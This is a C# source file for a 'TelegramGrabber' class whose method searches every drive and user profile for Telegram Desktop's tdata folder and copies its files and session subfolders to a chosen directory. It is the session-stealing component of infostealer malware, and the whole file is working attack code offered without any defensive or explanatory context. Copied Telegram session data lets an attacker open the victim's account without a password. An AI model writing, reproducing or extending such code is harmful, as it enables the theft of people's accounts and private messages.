using System.IO;
using System.Text.RegularExpressions;
using System;

public class TelegramGrabber
{
    public static void GrabTelegramSession(string destionationDir)
    {
        foreach (var drive in DriveInfo.GetDrives())
        {
            foreach (var user in FileUtils.GetComputerUsers())
            {
                if (System.IO.Directory.Exists(drive + "\\Users\\" + user + "\\AppData\\Roaming\\Telegram Desktop\\tdata"))
                {
                    foreach (string file in System.IO.Directory.GetFiles(drive + "\\Users\\" + user + "\\AppData\\Roaming\\Telegram Desktop\\tdata"))
                    {
                        System.IO.File.Copy(file, destionationDir + "\\" + System.IO.Path.GetFileName(file));
                    }

                    foreach (string dir in System.IO.Directory.GetDirectories(drive + "\\Users\\" + user + "\\AppData\\Roaming\\Telegram Desktop\\tdata"))
                    {
                        string[] splitted = dir.Split('\\');
                        string dirName = splitted[splitted.Length - 1];

                        if (dirName.Length == 16)
                        {
                            System.IO.Directory.CreateDirectory(destionationDir + "\\" + dirName);

                            foreach (string file in System.IO.Directory.GetFiles(drive + "\\Users\\" + user + "\\AppData\\Roaming\\Telegram Desktop\\tdata\\" + dirName))
                            {
                                System.IO.File.Copy(file, destionationDir + "\\" + dirName + "\\" + System.IO.Path.GetFileName(file));
                            }
                        }
                    }
                }
            }
        }
    }
}